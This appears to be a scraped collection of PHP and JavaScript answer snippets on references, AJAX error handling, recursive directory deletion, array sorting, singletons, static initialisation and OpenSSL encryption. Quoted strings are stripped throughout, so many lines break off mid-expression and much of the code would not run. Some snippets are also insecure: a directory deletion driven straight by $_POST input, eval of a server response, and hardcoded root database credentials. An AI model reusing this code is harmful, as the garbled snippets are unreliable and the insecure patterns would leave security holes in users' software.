<?php function swap(&$x, &$y) { $tmp = $x; $x = $y; $y = $tmp; } $a = new Holder( $b = new Holder( swap($a, $b); echo $a->getValue() . ", " . $b->getValue() . "\n";
class X { var $abc = 10; } class Y { var $abc = 20; function changeValue($obj) { $obj->abc = 30; } } $x = new X(); $y = new Y(); echo $x->abc; $y->changeValue($x); echo $x->abc;
class X { var $abc = 10; } class Y { var $abc = 20; function changeValue($obj) { $obj = new Y(); } } $x = new X(); $y = new Y(); echo $x->abc; $y->changeValue($x); echo $x->abc;
class X { var $abc = 10; } class Y { var $abc = 20; function changeValue(&$obj) { $obj = new Y(); } } $x = new X(); $y = new Y(); echo $x->abc; $y->changeValue($x); echo $x->abc;
$var1 = "test"; $var2 = $var1; $var2 = "new test"; $var3 = &$var2; $var3 = "final test"; print ("var1: $var1, var2: $var2, var3: $var3);
$var1 = "foo"; $var2 = "bar"; changeThem($var1, $var2); print "var1: $var1, var2: $var2"; function changeThem($var1, &$var2){ $var1 = "FOO"; $var2 = "BAR"; }
class Foo{ public $var1; function __construct(){ $this->var1 = "foo"; } public function printFoo(){ print $this->var1; } } $foo = new Foo(); changeFoo($foo); $foo->printFoo(); function changeFoo($foo){ $foo->var1 = "FOO"; }
<?php function changeValue(&$var) { $var++; } $result=5; changeValue($result); echo $result; ?>
$fred = 5; $larry = & $fred; $larry = 8; echo $fred;
class Holder { private $value; public function __construct( $value ) { $this->value = $value; } public function getValue() { return $this->value; } public function setValue( $value ) { return $this->value = $value; } } class Swap { public function SwapObjects( Holder $x, Holder $y ) { $tmp = $x; $x = $y; $y = $tmp; } public function SwapValues( Holder $x, Holder $y ) { $tmp = $x->getValue(); $x->setValue($y->getValue()); $y->setValue($tmp); } } $a1 = new Holder( $b1 = new Holder( $a2 = new Holder( $b2 = new Holder( Swap::SwapValues($a1, $b1); Swap::SwapObjects($a2, $b2); echo echo
function add(&$var){ $var++; } $a = 1; $b = 10; add($a); echo "a is $a,"; add($b); echo " a is $a, and b is $b";
$.ajax({ type: "post", data: {id: 0}, cache: false, url: "doIt.php", dataType: "text", error: function (request, error) { console.log(arguments); alert(" Can }, success: function () { alert(" Done ! "); } });
[XMLHttpRequest readyState=4 status=500, "error", undefined]
error: function(xhr, status, error) { var err = eval("(" + xhr.responseText + ")"); alert(err.Message); }
error: function(xhr, status, error) { alert(xhr.responseText); }
error: function(xhr, status, error) { var err = JSON.parse(xhr.responseText); alert(err.Message); }
function showErrorMessage(xhr, status, error) { if (xhr.responseText != "") { var jsonResponseText = $.parseJSON(xhr.responseText); var jsonResponseStatus = var message = $.each(jsonResponseText, function(name, val) { if (name == "ResponseStatus") { jsonResponseStatus = $.parseJSON(JSON.stringify(val)); $.each(jsonResponseStatus, function(name2, val2) { if (name2 == "Message") { message = val2; } }); } }); alert(message); } }
$(document).ajaxError( function (event, jqXHR, ajaxSettings, thrownError) { alert( });
error: function(xhr, status, error) { var acc = [] $.each(xhr, function(index, value) { acc.push(index + }); alert(JSON.stringify(acc)); }
error: function(xhr, status, error) { alert(error); }
error: function (xhr) { var err = JSON.parse(xhr.responseText); alert(err.message); }
public static function deleteDir($dirPath) { if (! is_dir($dirPath)) { throw new InvalidArgumentException("$dirPath must be a directory"); } if (substr($dirPath, strlen($dirPath) - 1, 1) != $dirPath .= } $files = glob($dirPath . foreach ($files as $file) { if (is_dir($file)) { self::deleteDir($file); } else { unlink($file); } } rmdir($dirPath); }
$dir = $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS); $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST); foreach($files as $file) { if ($file->isDir()){ rmdir($file->getRealPath()); } else { unlink($file->getRealPath()); } } rmdir($dir);
function deleteDir($path) { return is_file($path) ? @unlink($path) : array_map(__FUNCTION__, glob($path. }
class Utils { public static function deleteDir($path) { $class_func = array(__CLASS__, __FUNCTION__); return is_file($path) ? @unlink($path) : array_map($class_func, glob($path. } }
function deleteDir($path) { if (empty($path)) { return false; } return is_file($path) ? @unlink($path) : array_map(__FUNCTION__, glob($path. }
function deleteDirectory($dirPath) { if (is_dir($dirPath)) { $objects = scandir($dirPath); foreach ($objects as $object) { if ($object != "." && $object !="..") { if (filetype($dirPath . DIRECTORY_SEPARATOR . $object) == "dir") { deleteDirectory($dirPath . DIRECTORY_SEPARATOR . $object); } else { unlink($dirPath . DIRECTORY_SEPARATOR . $object); } } } reset($objects); rmdir($dirPath); } }
<?php function delTree($dir) { $files = array_diff(scandir($dir), array( foreach ($files as $file) { (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); } return rmdir($dir); } ?>
use Symfony\Component\Filesystem\Filesystem; (new Filesystem)->remove($dir);
function xrmdir($dir) { $items = scandir($dir); foreach ($items as $item) { if ($item === continue; } $path = $dir. if (is_dir($path)) { xrmdir($path); } else { unlink($path); } } rmdir($dir); }
function delete_dir($src) { $dir = opendir($src); while(false !== ( $file = readdir($dir)) ) { if (( $file != if ( is_dir($src . delete_dir($src . } else { unlink($src . } } } closedir($dir); rmdir($src); }
function deleteDir($path) { return !empty($path) && is_file($path) ? @unlink($path) : (array_reduce(glob($path. }
function recursiveDelete($dirPath, $deleteParent = true){ foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) { $path->isFile() ? unlink($path->getPathname()) : rmdir($path->getPathname()); } if($deleteParent) rmdir($dirPath); }
<?php public static function delTree($dir) { $files = array_diff(scandir($dir), array( foreach ($files as $file) { (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); } return rmdir($dir); } ?>
function deleteDir($dirPath) { if (!is_dir($dirPath)) { throw new InvalidArgumentException("$dirPath must be a directory"); } if (substr($dirPath, strlen($dirPath) - 1, 1) != $dirPath .= } $files = scandir($dirPath); foreach ($files as $file) { if ($file === if (is_dir($dirPath.$file)) { deleteDir($dirPath.$file); } else { if ($dirPath.$file !== __FILE__) { unlink($dirPath.$file); } } } rmdir($dirPath); }
function my_folder_delete($path) { if(!empty($path) && is_dir($path) ){ $dir = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS); $files = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::CHILD_FIRST); foreach ($files as $f) {if (is_file($f)) {unlink($f);} else {$empty_dirs[] = $f;} } if (!empty($empty_dirs)) {foreach ($empty_dirs as $eachDir) {rmdir($eachDir);}} rmdir($path); } }
$it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS); $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST); foreach($files as $file) { if ($file->isLink()) { unlink($file->getPathname()); } else if ($file->isDir()){ rmdir($file->getPathname()); } else { unlink($file->getPathname()); } } rmdir($dir);
function delete_folder($folder) { $glob = glob($folder); foreach ($glob as $g) { if (!is_dir($g)) { unlink($g); } else { delete_folder("$g/*"); rmdir($g); } } }
if( ! empty( $files ) ) { foreach( $files as $file ) { } }
private function recursiveRemoveDirectory( $directory ) { if( ! is_dir( $directory ) ) { throw new InvalidArgumentException( "$directory must be a directory" ); } if( substr( $directory, strlen( $directory ) - 1, 1 ) != { $directory .= } $files = glob( $directory . "*" ); if( ! empty( $files ) ) { foreach( $files as $file ) { if( is_dir( $file ) ) { $this->recursiveRemoveDirectory( $file ); } else { unlink( $file ); } } } rmdir( $directory ); }
function unlink_r($from) { if (!file_exists($from)) {return false;} $dir = opendir($from); while (false !== ($file = readdir($dir))) { if ($file == if (is_dir($from . DIRECTORY_SEPARATOR . $file)) { unlink_r($from . DIRECTORY_SEPARATOR . $file); } else { unlink($from . DIRECTORY_SEPARATOR . $file); } } rmdir($from); closedir($dir); return true; }
function deleteFolder($rootPath) { foreach(new DirectoryIterator($rootPath) as $fileToDelete) { if($fileToDelete->isDot()) continue; if ($fileToDelete->isFile()) unlink($fileToDelete->getPathName()); if ($fileToDelete->isDir()) deleteFolder($fileToDelete->getPathName()); } rmdir($rootPath); }
function removeDirectory($path) { $files = glob($path . foreach ($files as $file) { is_dir($file) ? removeDirectory($file) : unlink($file); } rmdir($path); return; }
/* * Remove the directory and its content (all files and subdirectories). * @param string $dir the directory name */ function rmrf($dir) { foreach (glob($dir) as $file) { if (is_dir($file)) { rmrf("$file/*"); rmdir($file); } else { unlink($file); } } }
<?php function rrmdir($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink ($dir."/".$object); } } reset($objects); rmdir($dir); } } ?>
function delete_directory($dirPath){ if(is_dir($dirPath)){ $objects=new DirectoryIterator($dirPath); foreach ($objects as $object){ if(!$object->isDot()){ if($object->isDir()){ delete_directory($object->getPathname()); }else{ unlink($object->getPathname()); } } } rmdir($dirPath); }else{ throw new Exception(__FUNCTION__. } }
function rm_rf($path) { if (@is_dir($path) && is_writable($path)) { $dp = opendir($path); while ($ent = readdir($dp)) { if ($ent == continue; } $file = $path . DIRECTORY_SEPARATOR . $ent; if (@is_dir($file)) { rm_rf($file); } elseif (is_writable($file)) { unlink($file); } else { echo $file . "is not writable and cannot be removed. Please fix the permission or select a new path.\n"; } } closedir($dp); return rmdir($path); } else { return @unlink($path); } }
$dir = if (is_dir($dir)) { foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)) as $filename) { if ($filename->isDir()) continue; unlink($filename); } rmdir($dir); }
function Delete_Directory($Dir) { if(is_dir($Dir)) { $files = glob( $Dir . foreach( $files as $file ) { Delete_Directory( $file ); } if(file_exists($Dir)) { rmdir($Dir); } } elseif(is_file($Dir)) { unlink( $Dir ); } }
function deletePath($path) { if(is_file($path)){ unlink($path); } elseif(is_dir($path)){ $path = (substr($path, -1) !== DIRECTORY_SEPARATOR) ? $path . DIRECTORY_SEPARATOR : $path; $files = glob($path . foreach ($files as $file) { deleteDirPath($file); } rmdir($path); } else { return false; } }
$dirname = $_POST[ $folder_handler = dir($dirname); while ($file = $folder_handler->read()) { if ($file == "." || $file == "..") continue; unlink($dirname. } $folder_handler->close(); rmdir($dirname);
function f_parse_csv($file, $longest, $delimiter) { $mdarray = array(); $file = fopen($file, "r"); while ($line = fgetcsv($file, $longest, $delimiter)) { array_push($mdarray, $line); } fclose($file); return $mdarray; }
foreach ($mdarray as $key => $row) { $dates[$key] = $row[0]; } array_multisort($dates, SORT_DESC, $mdarray);
array_multisort(array_column($mdarray, 0), SORT_DESC, $mdarray);
function make_comparer() { $criteria = func_get_args(); foreach ($criteria as $index => $criterion) { $criteria[$index] = is_array($criterion) ? array_pad($criterion, 3, null) : array($criterion, SORT_ASC, null); } return function($first, $second) use (&$criteria) { foreach ($criteria as $criterion) { list($column, $sortOrder, $projection) = $criterion; $sortOrder = $sortOrder === SORT_DESC ? -1 : 1; if ($projection) { $lhs = call_user_func($projection, $first[$column]); $rhs = call_user_func($projection, $second[$column]); } else { $lhs = $first[$column]; $rhs = $second[$column]; } if ($lhs < $rhs) { return -1 * $sortOrder; } else if ($lhs > $rhs) { return 1 * $sortOrder; } } return 0; }; }
0 => the column name to sort on (mandatory) 1 => either SORT_ASC or SORT_DESC (optional) 2 => a projection function (optional)
class TableSorter { protected $column; function __construct($column) { $this->column = $column; } function sort($table) { usort($table, array($this, return $table; } function compare($a, $b) { if ($a[$this->column] == $b[$this->column]) { return 0; } return ($a[$this->column] < $b[$this->column]) ? -1 : 1; } }
$sorter = new TableSorter(0); $mdarray = $sorter->sort($mdarray);
/** * Sorting array of associative arrays - multiple row sorting using a closure. * See also: http: * * @param array $data input-array * @param string|array $fields array-keys * @license Public Domain * @return array */ function sortArray( $data, $field ) { $field = (array) $field; uasort( $data, function($a, $b) use($field) { $retval = 0; foreach( $field as $fieldname ) { if( $retval == 0 ) $retval = strnatcmp( $a[$fieldname], $b[$fieldname] ); } return $retval; } ); return $data; } $data = array( array( "firstname" => "Mary", "lastname" => "Johnson", "age" => 25 ), array( "firstname" => "Amanda", "lastname" => "Miller", "age" => 18 ), array( "firstname" => "James", "lastname" => "Brown", "age" => 31 ), array( "firstname" => "Patricia", "lastname" => "Williams", "age" => 7 ), array( "firstname" => "Michael", "lastname" => "Davis", "age" => 43 ), array( "firstname" => "Sarah", "lastname" => "Miller", "age" => 24 ), array( "firstname" => "Patrick", "lastname" => "Miller", "age" => 27 ) ); $data = sortArray( $data, $data = sortArray( $data, array(
function sort_multi_array ($array, $key) { $keys = array(); for ($i=1;$i<func_num_args();$i++) { $keys[$i-1] = func_get_arg($i); } $func = function ($a, $b) use ($keys) { for ($i=0;$i<count($keys);$i++) { if ($a[$keys[$i]] != $b[$keys[$i]]) { return ($a[$keys[$i]] < $b[$keys[$i]]) ? -1 : 1; } } return 0; }; usort($array, $func); return $array; }
function cmp($a, $b) { $p1 = $a[ $p2 = $b[ return (float)$p1 > (float)$p2; } uasort($my_array, "cmp");
class Sorter { var $sort_fields; var $backwards = false; var $numeric = false; function sort() { $args = func_get_args(); $array = $args[0]; if (!$array) return array(); $this->sort_fields = array_slice($args, 1); if (!$this->sort_fields) return $array(); if ($this->numeric) { usort($array, array($this, } else { usort($array, array($this, } return $array; } function numericCompare($a, $b) { foreach($this->sort_fields as $sort_field) { if ($a[$sort_field] == $b[$sort_field]) { continue; } return ($a[$sort_field] < $b[$sort_field]) ? ($this->backwards ? 1 : -1) : ($this->backwards ? -1 : 1); } return 0; } function stringCompare($a, $b) { foreach($this->sort_fields as $sort_field) { $cmp_result = strcasecmp($a[$sort_field], $b[$sort_field]); if ($cmp_result == 0) continue; return ($this->backwards ? -$cmp_result : $cmp_result); } return 0; } } $start_data = array( array( array( array( ); $sorter = new Sorter(); print_r($sorter->sort($start_data, $sorter = new Sorter(); print_r($sorter->sort($start_data, $sorter = new Sorter(); $sorter->backwards = true; print_r($sorter->sort($start_data, $sorter = new Sorter(); $sorter->numeric = true; print_r($sorter->sort($start_data,
function sort2d_bycolumn($array, $column, $method, $has_header) { if ($has_header) $header = array_shift($array); foreach ($array as $key => $row) { $narray[$key] = $row[$column]; } array_multisort($narray, $method, $array); if ($has_header) array_unshift($array, $header); return $array; }
foreach ($names_stuff as $name_stuff) { $sorted_names[] = $name_stuff[0] . } sort($sorted_names, SORT_STRING);
foreach ($sorted_names as $sorted_name) { $name_stuff = explode( }
/** * Singleton class * */ final class UserFactory { /** * Call this method to get singleton * * @return UserFactory */ public static function Instance() { static $inst = null; if ($inst === null) { $inst = new UserFactory(); } return $inst; } /** * Private ctor so nobody else can instantiate it * */ private function __construct() { } }
$fact = UserFactory::Instance(); $fact2 = UserFactory::Instance();
class Singleton { protected static $instance = null; protected function __construct() { } protected function __clone() { } public static function getInstance() { if (!isset(static::$instance)) { static::$instance = new static; } return static::$instance; } }
class Foobar extends Singleton {}; $foo = Foobar::getInstance();
class Singleton { private static $instances = array(); protected function __construct() {} protected function __clone() {} public function __wakeup() { throw new Exception("Cannot unserialize singleton"); } public static function getInstance() { $cls = get_called_class(); if (!isset(self::$instances[$cls])) { self::$instances[$cls] = new static; } return self::$instances[$cls]; } }
class Foo extends Singleton {} class Bar extends Singleton {} echo get_class(Foo::getInstance()) . "\n"; echo get_class(Bar::getInstance()) . "\n";
<?php /** * Singleton Pattern. * * Modern implementation. */ class Singleton { /** * Call this method to get singleton */ public static function instance() { static $instance = false; if( $instance === false ) { $instance = new static(); } return $instance; } /** * Make constructor private, so nobody can call "new Class". */ private function __construct() {} /** * Make clone magic method private, so nobody can clone instance. */ private function __clone() {} /** * Make sleep magic method private, so nobody can serialize instance. */ private function __sleep() {} /** * Make wakeup magic method private, so nobody can unserialize instance. */ private function __wakeup() {} }
<?php /** * Database. * * Inherited from Singleton, so it */ class Database extends Singleton { protected $label; /** * Example of that singleton is working correctly. */ public function setLabel($label) { $this->label = $label; } public function getLabel() { return $this->label; } } $database = Database::instance(); $database->setLabel( echo $database->getLabel() . PHP_EOL; $other_db = Database::instance(); echo $other_db->getLabel() . PHP_EOL; $other_db->setLabel( echo $database->getLabel() . PHP_EOL; echo $other_db->getLabel() . PHP_EOL;
$inst1=UserFactory::Instance(); $inst2=clone $inst1;
protected static $_instance; public static function getInstance() { if(is_null(self::$_instance)) { self::$_instance = new self(); } return self::$_instance; }
<?php /** * Singleton patter in php **/ trait SingletonTrait { protected static $inst = null; /** * call this method to get instance **/ public static function getInstance(){ if (static::$inst === null){ static::$inst = new static(); } return static::$inst; } /** * protected to prevent clonning **/ protected function __clone(){ } /** * protected so no one else can instance it **/ protected function __construct(){ } }
/** * example of class definitions using SingletonTrait */ class DBFactory { /** * we are adding the trait here **/ use SingletonTrait; /** * This class will have a single db connection as an example **/ protected $db; /** * as an example we will create a PDO connection **/ protected function __construct(){ $this->db = new PDO( } } class DBFactoryChild extends DBFactory { /** * we repeating the inst so that it will differentiate it * from UserFactory singleton **/ protected static $inst = null; } /** * example of instanciating the classes */ $uf0 = DBFactoryChild::getInstance(); var_dump($uf0); $uf1 = DBFactory::getInstance(); var_dump($uf1); echo $uf0 === $uf1;
abstract class SingletonBase { private static $storage = array(); public static function Singleton($class) { if(in_array($class,self::$storage)) { return self::$storage[$class]; } return self::$storage[$class] = new $class(); } public static function storage() { return self::$storage; } }
public static function Singleton() { return SingletonBase::Singleton(get_class()); }
include class Database { public static function Singleton() { return SingletonBase::Singleton(get_class()); } public function run() { echo } } $Database = Database::Singleton(); $Database->run();
class Database{ private $db; public static $instance; private function __construct(){ } private function __clone() {} public static function getInstance(){ if( !(self::$instance instanceof self) ){ self::$instance = new self(); } return self::$instance; } public function query($sql){ } } Access the method getInstance using $db = Singleton::getInstance(); $db->query();
<?php namespace wl; /** * @author DevWL * @dosc allows only one instance for each extending class. * it acts a litle bit as registry from the SingletonClassVendor abstract class point of view * but it provides a valid singleton behaviour for its children classes * Be aware, the singleton pattern is consider to be an anti-pattern * mostly because it can be hard to debug and it comes with some limitations. * In most cases you do not need to use singleton pattern * so take a longer moment to think about it before you use it. */ abstract class SingletonClassVendor { /** * holds an single instance of the child class * * @var array of objects */ protected static $instance = []; /** * @desc provides a single slot to hold an instance interchanble between all child classes. * @return object */ public static final function getInstance(){ $class = get_called_class(); if(!isset(self::$instance[$class]) || !self::$instance[$class] instanceof $class){ self::$instance[$class] = new static(); echo "new ". $class . PHP_EOL; return self::$instance[$class]; } echo "old ". $class . PHP_EOL; return static::$instance[$class]; } /** * Make constructor abstract to force protected implementation of the __constructor() method, so that nobody can call directly "new Class()". */ abstract protected function __construct(); /** * Make clone magic method private, so nobody can clone instance. */ private function __clone() {} /** * Make sleep magic method private, so nobody can serialize instance. */ private function __sleep() {} /** * Make wakeup magic method private, so nobody can unserialize instance. */ private function __wakeup() {} }
/** * EXAMPLE */ /** * @example 1 - Database class by extending SingletonClassVendor abstract class becomes fully functional singleton * __constructor must be set to protected becaouse: * 1 to allow instansiation from parent class * 2 to prevent direct instanciation of object with "new" keword. * 3 to meet requierments of SingletonClassVendor abstract class */ class Database extends SingletonClassVendor { public $type = "SomeClass"; protected function __construct(){ echo "DDDDDDDDD". PHP_EOL; } } /** * @example 2 - Config ... */ class Config extends SingletonClassVendor { public $name = "Config"; protected function __construct(){ echo "CCCCCCCCCC" . PHP_EOL; } }
/** * TESTING */ $bd1 = Database::getInstance(); $bd2 = Database::getInstance(); $bd3 = Config::getInstance(); $bd4 = Config::getInstance(); $bd5 = Config::getInstance(); $bd6 = Database::getInstance(); $bd7 = Database::getInstance(); $bd8 = Config::getInstance(); echo PHP_EOL."COMPARE ALL DATABASE INSTANCES".PHP_EOL; var_dump($bd1); echo echo echo echo PHP_EOL; echo PHP_EOL."COMPARE ALL CONFIG INSTANCES". PHP_EOL; var_dump($bd3); echo echo echo
class EncodeHTMLEntities { private static $instance = null; private $r = null; private function __clone(){ } private function __construct() { $allEntities = get_html_translation_table(HTML_ENTITIES, ENT_NOQUOTES); $specialEntities = get_html_translation_table(HTML_SPECIALCHARS, ENT_NOQUOTES); $this->r = array_diff($allEntities, $specialEntities); } public static function replace($string) { if(!(self::$instance instanceof self) ){ self::$instance = new self(); } return strtr($string, self::$instance->r); } } $start = microtime(true); for($x=0; $x<1000000; $x++){ $dump = EncodeHTMLEntities::replace("Reference method for diagnosis of CDAD, but clinical usefulness limited due to extended turnaround time (≥96 hrs)"); } $end = microtime(true); echo "Run time: ".($end-$start)." seconds using singleton\n"; $start = microtime(true); for($x=0; $x<1000000; $x++){ $allEntities = get_html_translation_table(HTML_ENTITIES, ENT_NOQUOTES); $specialEntities = get_html_translation_table(HTML_SPECIALCHARS, ENT_NOQUOTES); $r = array_diff($allEntities, $specialEntities); $dump = strtr("Reference method for diagnosis of CDAD, but clinical usefulness limited due to extended turnaround time (≥96 hrs)", $r); } $end = microtime(true); echo "Run time: ".($end-$start)." seconds without using singleton";
class SingletonDesignPattern { private static $instanceCount =0; private static $myInstance=null; private function __construct(){} private function __clone(){} public function __wakeup(){} public static function getInstance(){ if(self::$myInstance==null){ self::$myInstance=new SingletonDesignPattern(); self::$instanceCount++; } return self::$myInstance; } public static function getInstanceCount(){ return self::$instanceCount; } } $instance = SingletonDesignPattern::getInstance(); $instance = SingletonDesignPattern::getInstance(); $instance = SingletonDesignPattern::getInstance(); $instance = SingletonDesignPattern::getInstance(); echo "number of instances: ".SingletonDesignPattern::getInstanceCount();
/** * Singleton class * */ final class UserFactory { private static $_instance = null; /** * Private constructor * */ private function __construct() {} /** * Private clone method * */ private function __clone() {} /** * Call this method to get singleton * * @return UserFactory */ public static function getInstance() { if (self::$_instance === null) { self::$_instance = new UserFactory(); } return self::$_instance; } }
$user_factory = UserFactory::$_instance; class SecondUserFactory extends UserFactory { }
class Singleton { private static $instance; private $count = 0; protected function __construct(){ } public static function singleton(){ if (!isset(self::$instance)) { self::$instance = new Singleton; } return self::$instance; } public function increment() { return $this->count++; } protected function __clone(){ } protected function __wakeup(){ } }
<?php trait Singleton { public static function instance(){ static $instances = array(); $class = get_called_class(); if( !isset($instances[$class]) ) $instances[$class] = new $class(); return $instances[$class]; } protected function __clone() {} protected function __construct() {} }
class Database { public static $instance; public static function getInstance(){ if(!isset(Database::$instance) ) { Database::$instance = new Database(); } return Database::$instance; } private function __cunstruct() { } public function getQuery(){ return "Test Query Data"; } } $dbObj = Database::getInstance(); $dbObj2 = Database::getInstance(); var_dump($dbObj); var_dump($dbObj2); /* After execution you will get following output: object(Database)[1] object(Database)[1] */
class Database{ public static $instance; public static function getInstance(){ if(!isset(Database::$instance)){ Database::$instance=new Database(); return Database::$instance; } } $db=Database::getInstance(); $db2=Database::getInstance(); $db3=Database::getInstance(); var_dump($db); var_dump($db2); var_dump($db3);
object(Database)[1] object(Database)[1] object(Database)[1]
class Singleton{ private static $data; function __construct(){ if ($this::$data == null){ $this->makeSingleton(); } echo "<br/>".$this::$data; } private function makeSingleton(){ $this::$data = rand(0, 100); } public function change($new_val){ $this::$data = $new_val; } public function printme(){ echo "<br/>".$this::$data; } } $a = new Singleton(); $b = new Singleton(); $c = new Singleton(); $a->change(-2); $a->printme(); $b->printme(); $d = new Singleton(); $d->printme();
class Foo { private static $bar; static function init() { self::$bar = array(…); } } Foo::init();
class MyClass { public static function static_init() { } }
include($path . $klass . PHP_EXT); if(method_exists($klass,
interface StaticInit { public static function staticInit() { } } class MyClass implements StaticInit { public static function staticInit() { } }
class MyClass { public static function getTypeList() { return array( "type_a"=>"Type A", "type_b"=>"Type B", ); } }
if (array_key_exists($type, MyClass::getTypeList()) { }
private static $dates = null; public function __construct() { if (is_null(self::$dates)) { self::$dates = array( ); } }
class Something { private static $foo; private static getFoo() { if ($foo === null) $foo = [[ complicated initializer ]] return $foo; } public static bar() { [[ do something with self::getFoo() ]] } }
/** * @var object $db : map to database connection. */ public static $db= null; /** * db Function for initializing variable. * @return object */ public static function db(){ if( !isset(static::$db) ){ static::$db= new \Helpers\MySQL( array( "hostname"=> "localhost", "username"=> "root", "password"=> "password", "database"=> "db_name" ) ); } return static::$db; }
public static $kIdsByActions = array( MyClass1::kAction => 0, MyClass2::kAction => 1 );
$ cat static.php <?php class StaticClass { public static $stStateArr = NULL; public function __construct() { if (!isset(self::$stStateArr)) { self::initializeStStateArr(); } } public static function initializeStStateArr() { if (!isset(self::$stStateArr)) { self::$stStateArr = array( echo "In " . __FUNCTION__. "\n"; } } } print "Starting...\n"; StaticClass::initializeStStateArr(); $st = new StaticClass(); print_r (StaticClass::$stStateArr);
$ php static.php Starting... In initializeStStateArr Array ( [CA] => California [CO] => Colorado )
class UnsafeCrypto { const METHOD = /** * Encrypts (but does not authenticate) a message * * @param string $message - plaintext message * @param string $key - encryption key (raw binary expected) * @param boolean $encode - set to TRUE to return a base64-encoded * @return string (raw binary) */ public static function encrypt($message, $key, $encode = false) { $nonceSize = openssl_cipher_iv_length(self::METHOD); $nonce = openssl_random_pseudo_bytes($nonceSize); $ciphertext = openssl_encrypt( $message, self::METHOD, $key, OPENSSL_RAW_DATA, $nonce ); if ($encode) { return base64_encode($nonce.$ciphertext); } return $nonce.$ciphertext; } /** * Decrypts (but does not verify) a message * * @param string $message - ciphertext message * @param string $key - encryption key (raw binary expected) * @param boolean $encoded - are we expecting an encoded string? * @return string */ public static function decrypt($message, $key, $encoded = false) { if ($encoded) { $message = base64_decode($message, true); if ($message === false) { throw new Exception( } } $nonceSize = openssl_cipher_iv_length(self::METHOD); $nonce = mb_substr($message, 0, $nonceSize, $ciphertext = mb_substr($message, $nonceSize, null, $plaintext = openssl_decrypt( $ciphertext, self::METHOD, $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } }
$message = $key = hex2bin( $encrypted = UnsafeCrypto::encrypt($message, $key); $decrypted = UnsafeCrypto::decrypt($encrypted, $key); var_dump($encrypted, $decrypted);
$message = $key = hex2bin( $encrypted = UnsafeCrypto::encrypt($message, $key, true); $decrypted = UnsafeCrypto::decrypt($encrypted, $key, true); var_dump($encrypted, $decrypted);
class SaferCrypto extends UnsafeCrypto { const HASH_ALGO = /** * Encrypts then MACs a message * * @param string $message - plaintext message * @param string $key - encryption key (raw binary expected) * @param boolean $encode - set to TRUE to return a base64-encoded string * @return string (raw binary) */ public static function encrypt($message, $key, $encode = false) { list($encKey, $authKey) = self::splitKeys($key); $ciphertext = parent::encrypt($message, $encKey); $mac = hash_hmac(self::HASH_ALGO, $ciphertext, $authKey, true); if ($encode) { return base64_encode($mac.$ciphertext); } return $mac.$ciphertext; } /** * Decrypts a message (after verifying integrity) * * @param string $message - ciphertext message * @param string $key - encryption key (raw binary expected) * @param boolean $encoded - are we expecting an encoded string? * @return string (raw binary) */ public static function decrypt($message, $key, $encoded = false) { list($encKey, $authKey) = self::splitKeys($key); if ($encoded) { $message = base64_decode($message, true); if ($message === false) { throw new Exception( } } $hs = mb_strlen(hash(self::HASH_ALGO, $mac = mb_substr($message, 0, $hs, $ciphertext = mb_substr($message, $hs, null, $calculated = hash_hmac( self::HASH_ALGO, $ciphertext, $authKey, true ); if (!self::hashEquals($mac, $calculated)) { throw new Exception( } $plaintext = parent::decrypt($ciphertext, $encKey); return $plaintext; } /** * Splits a key into two separate keys; one for encryption * and the other for authenticaiton * * @param string $masterKey (raw binary) * @return array (two raw binary strings) */ protected static function splitKeys($masterKey) { return [ hash_hmac(self::HASH_ALGO, hash_hmac(self::HASH_ALGO, ]; } /** * Compare two strings without leaking timing information * * @param string $a * @param string $b * @ref https: * @return boolean */ protected static function hashEquals($a, $b) { if (function_exists( return hash_equals($a, $b); } $nonce = openssl_random_pseudo_bytes(32); return hash_hmac(self::HASH_ALGO, $a, $nonce) === hash_hmac(self::HASH_ALGO, $b, $nonce); } }
$message = $key = hex2bin( $encrypted = SaferCrypto::encrypt($message, $key); $decrypted = SaferCrypto::decrypt($encrypted, $key); var_dump($encrypted, $decrypted);
$msg = $signed_msg = sodium_crypto_sign($msg, $secret_sign_key); $original_msg = sodium_crypto_sign_open($signed_msg, $alice_sign_publickey); if ($original_msg === false) { throw new Exception( } else { echo $original_msg; }
<?php <----- START PHP </script> <----- END PHP ?> <----- JUST GARBAGE IN THE HTML
$result = substr($myStr, 0, 5); $result = mb_substr($myStr, 0, 5);
$mystr = "hello world" $str = substr($mystr, 0, 5); echo $str;
$result=$myStr[0].$myStr[1].$myStr[2].$myStr[3].$myStr[4];
<?php $myStr = "HelloWordl"; echo substr($myStr,0,5); ?>
<?php var_dump(5 ?: 0); var_dump(false ?: 0); var_dump(null ?: var_dump(true ?: 123); var_dump( ?>
$params = [ $param1 = isset($params[ $param2 = !empty($params[ $param3 = $params[ var_dump($param1,$param2,$param3); true true param3
function inArray(needle, haystack) { var length = haystack.length; for(var i = 0; i < length; i++) { if(haystack[i] == needle) return true; } return false; }
$a = array(array( if (in_array(array( echo " } if (in_array(array( echo " } if (in_array( echo " }
function arrayCompare(a1, a2) { if (a1.length != a2.length) return false; var length = a2.length; for (var i = 0; i < length; i++) { if (a1[i] !== a2[i]) return false; } return true; } function inArray(needle, haystack) { var length = haystack.length; for(var i = 0; i < length; i++) { if(typeof haystack[i] == if(arrayCompare(haystack[i], needle)) return true; } else { if(haystack[i] == needle) return true; } } return false; }
var a = [[ if(inArray([ alert( } if(inArray([ alert( } if(inArray( alert( }
if (!Array.prototype.indexOf) { Array.prototype.indexOf = function(elt ) { var len = this.length >>> 0; var from = Number(arguments[1]) || 0; from = (from < 0) ? Math.ceil(from) : Math.floor(from); if (from < 0) from += len; for (; from < len; from++) { if (from in this && this[from] === elt) return from; } return -1; }; }
arr.includes(searchElement) arr.includes(searchElement, fromIndex)
function in_array(needle, haystack) { for(var i in haystack) { if(haystack[i] == needle) return true; } return false; }
